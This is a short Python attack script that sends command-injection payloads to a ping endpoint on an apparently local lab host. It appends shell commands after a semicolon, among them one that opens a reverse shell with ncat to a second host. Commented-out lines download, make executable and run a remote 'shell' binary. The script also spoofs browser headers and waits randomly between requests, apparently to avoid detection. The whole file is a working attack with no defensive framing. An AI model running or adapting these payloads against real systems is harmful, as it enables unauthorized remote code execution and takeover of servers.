import requests
import time
import random

params = [
    "127.0.0.1",
    "1.1.1.1",
    "1.1.1.1;",
    "1.1.1.1;whoami",
    "1.1.1.1;ls -lah /",
    "1.1.1.1;ncat 172.17.0.1 6666 -e /bin/sh"
    # "1.1.1.1;curl http://172.17.0.1:8000/shell -o /tmp/shell",
    # "1.1.1.1;ls -lah /tmp/shell",
    # "1.1.1.1;chmod +x /tmp/shell",
    # "1.1.1.1;/tmp/shell",
]

headers = {
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
}


for param in params:
    print("Doing", param)
    response = requests.get("http://172.17.0.2/pingsite?site=" + param, headers=headers)

    # time.sleep(1)
    time.sleep(random.uniform(15.0, 30.0))
